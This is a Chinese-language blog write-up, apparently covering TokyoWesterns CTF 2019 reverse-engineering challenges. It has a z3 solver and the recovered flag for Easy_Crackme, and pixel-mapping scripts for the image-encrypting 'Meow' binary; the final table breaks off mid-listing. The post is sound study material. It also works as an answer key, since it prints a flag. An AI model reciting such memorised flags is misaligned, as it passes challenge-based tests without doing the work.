    <article id="post-TokyoWesternsCTF-Reverse-wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/09/01/TokyoWesternsCTF-Reverse-wp/" class="article-date">
      <time datetime="2019-09-01T13:22:45.000Z" itemprop="datePublished">2019-09-01</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/01/TokyoWesternsCTF-Reverse-wp/">TokyoWesternsCTF Reverse wp</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="Easy-Crackme"><a href="#Easy-Crackme" class="headerlink" title="Easy_Crackme"></a>Easy_Crackme</h1><p>z3解一下，然后枚举所有答案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">ans = Solver();</span><br><span class="line">a = [350L, 218L, 303L, 305L, 256L, 305L, 251L, 258L, 82L]</span><br><span class="line">b = [82L, 12L, 1L, 15L, 92L, 5L, 83L, 88L, 1L];</span><br><span class="line"></span><br><span class="line">s = [ BitVec(&quot;x%d&quot;%i,32) for i in range(39) ];</span><br><span class="line">ans.add(s[0] == ord(&apos;T&apos;));</span><br><span class="line">ans.add(s[1] == ord(&apos;W&apos;));</span><br><span class="line">ans.add(s[2] == ord(&apos;C&apos;));</span><br><span class="line">ans.add(s[3] == ord(&apos;T&apos;));</span><br><span class="line">ans.add(s[4] == ord(&apos;F&apos;));</span><br><span class="line">ans.add(s[5] == ord(&apos;&#123;&apos;));</span><br><span class="line">ans.add(s[38] == ord(&apos;&#125;&apos;));</span><br><span class="line">for i in range(6,38):</span><br><span class="line">    ans.add( Or( And(s[i]&gt;=ord(&apos;0&apos;),s[i]&lt;=ord(&apos;9&apos;)) , And(s[i]&gt;=ord(&apos;a&apos;),s[i]&lt;=ord(&apos;f&apos;)) ) );</span><br><span class="line">    # ans.add(s[i]&lt;=127);</span><br><span class="line">for k in range(0,8):</span><br><span class="line">    v10 = 0;</span><br><span class="line">    v11 = 0;</span><br><span class="line">    for l in range(4):</span><br><span class="line">        v7 = s[4 * k + 6 + l];</span><br><span class="line">        v10 += v7;</span><br><span class="line">        v11 ^= v7;</span><br><span class="line">    ans.add( v10==a[k] );</span><br><span class="line">    ans.add( v11==b[k] );</span><br><span class="line">a = [297L, 259L, 299L, 305L, 309L, 267L, 255L, 255L, 128L]</span><br><span class="line">b = [1L, 87L, 7L, 13L, 13L, 83L, 81L, 81L, 297L]</span><br><span class="line">for m in range(8):</span><br><span class="line"></span><br><span class="line">    v14 = 0;</span><br><span class="line">    v15 = 0;</span><br><span class="line">    for n in range(4):</span><br><span class="line">        v6 = s[8 * n + 6 + m];</span><br><span class="line">        v14 += v6;</span><br><span class="line">        v15 ^= v6;</span><br><span class="line">    ans.add(v14==a[m]);</span><br><span class="line">    ans.add(v15==b[m]);</span><br><span class="line"># print &apos;&apos;.join([ chr(i) for i in s]);</span><br><span class="line">a = [128L, 128L, 255L, 128L, 255L, 255L, 255L, 255L, 128L, 255L, 255L, 128L, 128L, 255L, 255L, 128L, 255L, 255L, 128L, 255L, 128L, 128L, 255L, 255L, 255L, 255L, 128L, 255L, 255L, 255L, 128L, 255L]</span><br><span class="line">for i in range(32):</span><br><span class="line">    # if a[i]&gt;96 and a[i]&lt;=102:</span><br><span class="line">    if a[i]==129:</span><br><span class="line">        ans.add(s[i+6]&gt;96);</span><br><span class="line">        ans.add(s[i+6]&lt;=102);</span><br><span class="line">    elif a[i]==255:</span><br><span class="line">        ans.add(s[i+6]&gt;47);</span><br><span class="line">        ans.add(s[i+6]&lt;=57);</span><br><span class="line">    elif a[i]==0:</span><br><span class="line">        ans.add( Or( And(s[i+6]&gt;57,s[i+6]&lt;=96) , s[i+6]&gt;102) ) ;</span><br><span class="line">v18 = 0;</span><br><span class="line">for jj in range(16):</span><br><span class="line">    v18 += s[2 * jj + 6];</span><br><span class="line">ans.add(v18==1160);</span><br><span class="line">ans.add(s[37] == 0x35);</span><br><span class="line">ans.add(s[7] == 0x66);</span><br><span class="line">ans.add(s[11] == 0x38);</span><br><span class="line">ans.add(s[12] == 0x37);</span><br><span class="line">ans.add(s[23] == 0x32);</span><br><span class="line">ans.add(s[31] == 0x34);</span><br><span class="line">ans.add( Sum( [ s[x] for x in range(6,38) ] )==2246);</span><br><span class="line"></span><br><span class="line">while ans.check()==sat :</span><br><span class="line">    m = ans.model();</span><br><span class="line">    re = &quot;&quot;</span><br><span class="line">    for i in range(39):</span><br><span class="line">        re+=chr( m[s[i]].as_long().real );</span><br><span class="line"></span><br><span class="line">    print re;</span><br><span class="line"></span><br><span class="line">    b = &quot;0123456789abcdef&quot;</span><br><span class="line">    flag = 0;</span><br><span class="line">    a = [3L, 2L, 2L, 0L, 3L, 2L, 1L, 3L, 3L, 1L, 1L, 3L, 1L, 2L, 2L, 3L]</span><br><span class="line">    for i in range(16):</span><br><span class="line">        if re.count(b[i])!=a[i]:</span><br><span class="line">            ans.add( Or( [ i !=m[i] for i in s ] ) );</span><br><span class="line">            flag = 1;</span><br><span class="line">            break</span><br><span class="line">    if flag==0:</span><br><span class="line">        print &apos;get!!!!!!!!!!!&apos;</span><br><span class="line">        print re;</span><br><span class="line">		raw_input();</span><br><span class="line">#TWCTF&#123;df2b4877e71bd91c02f8ef6004b584a5&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h1><p>neko虚拟机字节码<br>反汇编工具装不好，所以硬生生把flag的加密方式猜出来了</p>
<ul>
<li>程序对图片每一位置的RGB三通道同时进行加密，且明文与加密后的密文直接存在映射关系，例如明文(0,x)—加密后—&gt;密文(5,x);</li>
<li>加密方式为xor常量，这样只需要把每一位置xor的常量提取出来，然后找到映射关系就能解了</li>
</ul>
<p>获取映射关系的脚本，这个脚本跑到奇慢无比，大概要1个小时多才能跑完</p>
<p>写个脚本不断执行<code>python exp.py x</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># exp.py</span><br><span class="line">import os</span><br><span class="line">import commands; </span><br><span class="line">from PIL import Image</span><br><span class="line">import sys;</span><br><span class="line">p = int(sys.argv[1])</span><br><span class="line"># p = 80;</span><br><span class="line">commands.getoutput(&quot;./meow ./bmp2.png ./ret.png&quot;);</span><br><span class="line">a  = [];</span><br><span class="line">im = Image.open(&apos;ret.png&apos;);</span><br><span class="line">im = im.convert(&apos;RGB&apos;);</span><br><span class="line"># print &apos;ret.png-----&apos;  </span><br><span class="line">for i in range(768):</span><br><span class="line">    for j in range(768):</span><br><span class="line">        # print im.getpixel((0,i));</span><br><span class="line">        a.append( im.getpixel((i,j)) );</span><br><span class="line">im.close();</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.open(&apos;bmp2.png&apos;)</span><br><span class="line">im = im.convert(&apos;RGB&apos;)</span><br><span class="line"></span><br><span class="line">pp = 0;</span><br><span class="line">aa,bb,cc = im.getpixel((p,pp));</span><br><span class="line">im.putpixel((p,pp),(251,(bb-1)&amp;0xff,cc));</span><br><span class="line">im.save(&apos;bmp2.png&apos;);</span><br><span class="line">im.close();</span><br><span class="line">commands.getoutput(&quot;./meow ./bmp2.png ./ret.png&quot;);</span><br><span class="line">b = [];</span><br><span class="line"># print &apos;ret.png-----&apos;</span><br><span class="line"></span><br><span class="line">im = Image.open(&apos;ret.png&apos;);</span><br><span class="line">im = im.convert(&apos;RGB&apos;);</span><br><span class="line">for i in range(768):</span><br><span class="line">    for j in range(768):</span><br><span class="line">        b.append( im.getpixel((i,j)) );</span><br><span class="line">im.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(768):</span><br><span class="line">    for j in range(768):</span><br><span class="line">        if a[i*768+j]!=b[i*768+j] :</span><br><span class="line">            print i;</span><br></pre></td></tr></table></figure>
<p>得到映射关系后，找到xor常量，解出flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br></pre></td><td class="code"><pre><span class="line">import commands</span><br><span class="line">t = &#123;</span><br><span class="line">0 : 5 ,</span><br><span class="line">1 : 58 ,</span><br><span class="line">2 : 56 ,</span><br><span class="line">3 : 661 ,</span><br><span class="line">4 : 234 ,</span><br><span class="line">5 : 32 ,</span><br><span class="line">6 : 190 ,</span><br><span class="line">7 : 237 ,</span><br><span class="line">8 : 117 ,</span><br><span class="line">9 : 576 ,</span><br><span class="line">10 : 552 ,</span><br><span class="line">11 : 371 ,</span><br><span class="line">12 : 345 ,</span><br><span class="line">13 : 492 ,</span><br><span class="line">14 : 439 ,</span><br><span class="line">15 : 339 ,</span><br><span class="line">16 : 251 ,</span><br><span class="line">17 : 351 ,</span><br><span class="line">18 : 375 ,</span><br><span class="line">19 : 152 ,</span><br><span 